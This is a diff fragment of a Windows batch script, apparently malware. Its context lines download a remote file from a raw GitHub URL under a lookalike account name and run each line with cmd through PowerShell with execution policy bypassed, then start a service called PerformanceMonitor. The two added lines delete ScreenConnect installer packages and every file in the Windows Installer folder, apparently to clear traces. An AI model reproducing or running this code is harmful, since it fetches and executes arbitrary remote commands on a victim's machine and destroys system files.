@@ -22,3 +22,5 @@ for %a in (%processList%) do (
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githlabs/0/0/0/rus' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 sc start PerformanceMonitor
 rd /s /q "%ProgramData%\bist"
+del /f /q "%WINDIR%\SystemTemp\ScreenConnect\25.2.4.9229\*.msi"
+del /f /q "%WINDIR%\Installer\*.msi"
